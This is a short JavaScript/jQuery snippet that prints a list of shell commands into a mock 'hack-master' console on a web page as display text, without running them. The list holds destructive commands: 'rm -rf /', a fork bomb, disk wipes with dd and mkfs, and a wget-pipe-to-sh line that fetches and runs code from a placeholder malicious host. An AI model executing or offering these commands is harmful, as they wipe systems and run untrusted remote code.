
var commands = ["sudo rm -rf /", ":(){:|:&};:", "command > /dev/sda", "mv folder /dev/null", "wget malicious_source.com/rip -O- | sh", "mkfs.ext3 /dev/sda", "^foo^bar", "dd if=/dev/random of=/dev/sda"]

// # Console

$(document).ready(function () {
  for (var i = 0; i < commands.length; i++) {
    $("#console-text").append("<p class='command'><span class='user'>admin@hack-master</span><span class='white'>$</span> "+commands[i]+"</p>");
  }
});
